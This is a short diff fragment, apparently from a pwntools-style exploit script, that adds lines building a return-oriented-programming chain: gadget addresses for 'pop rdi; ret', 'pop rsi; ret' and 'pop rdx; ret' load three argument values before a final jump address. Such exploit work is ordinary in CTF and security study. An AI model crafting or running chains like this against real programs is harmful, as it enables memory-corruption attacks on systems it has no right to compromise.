@@ -1,0 +1,7 @@
+payload = p64(0x6b7fc1)
+#0x00000000006b7fc1: pop rdi; ret; 
+payload += p64(0x100001)+p64(0x585eb0)
+# 0x0000000000585eb0: pop rsi; ret; 
+payload += p64(0x100002)+p64(0x6b9a8d)
+# 0x00000000006b9a8d: pop rdx; ret; 
+payload += p64(0x100003)+p64(0x401331)
